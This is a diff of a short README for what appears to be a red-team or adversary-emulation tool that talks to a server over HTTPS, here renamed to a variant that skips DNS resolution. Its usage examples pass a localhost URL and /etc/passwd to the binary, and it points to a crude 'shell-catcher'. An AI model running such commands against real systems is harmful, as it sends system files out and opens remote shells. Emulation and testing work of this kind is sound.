-Comms over HTTPS
-================
-Nearly the same as [`comms_over_tls`](../comms_over_tls) but uses HTTPS for
-its comms instead of plain TLS.
+Comms Without DNS
+=================
+Nearly the same as [`comms_over_https`](../comms_over_https) but can skip doing
+DNS resolution by passing the server's IP addres and port via an environment
+variable, `ALPT4ATS_REAL_ADDRESS`, by default.
 
 A crude shell-catcher may be found in the
 [`letsencryptshellcatcher`](../letsencryptshellcatcher) directory.

 Run it with `-https /somepath`, and put the same `/somepath` in the server
 URL.

 ### Examples
 Set the address and file via a heredoc:
 ```sh
-./comms_over_https 7<<_eof
+./comms_without_dns 7<<_eof
 https://localhost:5555/somepath /etc/passwd
 _eof
 ```
 
 Set just the address via bash's Here String:
 ```sh
-./bin/comms_over_https 7<<<"https://localhost:5555/somepath"
+./bin/comms_without_dns 7<<<"https://localhost:5555/somepath"
